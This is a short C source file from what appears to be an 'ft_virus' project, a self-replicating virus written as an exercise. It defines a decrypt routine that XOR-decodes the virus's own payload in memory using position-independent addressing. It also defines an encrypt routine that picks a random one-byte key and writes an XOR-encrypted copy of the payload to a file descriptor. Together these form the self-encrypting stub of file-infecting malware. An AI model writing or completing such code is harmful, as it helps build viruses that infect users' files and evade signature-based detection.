#include "ft_virus.h"

void decrypt()
{
	char	*payload_addr;
	size_t	index;
	size_t	size;
	char	key;

	index = 0;
	payload_addr = (char*)(get_rel_addr() - (u64)&get_rel_addr + (u64)&payload);
	key = *(char*)(get_rel_addr() - (u64)&get_rel_addr + (u64)&payload_end + 5);
	size = &payload_end - &payload;
	while (index < size)
	{
		payload_addr[index] ^= key;
		index += 1;
	}
}

char encrypt(int fd)
{
	char	array[&payload_end - &payload];
	char	*payload_addr;
	size_t	index;
	size_t	size;
	char	key;

	GETRANDOM(&key, sizeof(key), 0);
	payload_addr = (char*)(get_rel_addr() - (u64)&get_rel_addr + (u64)&payload);
	size = &payload_end - &payload;
	index = 0;
	while (index < size)
	{
		array[index] = payload_addr[index] ^ key;
		index += 1;
	}
	WRITE(fd, array, size);
	return key;
}
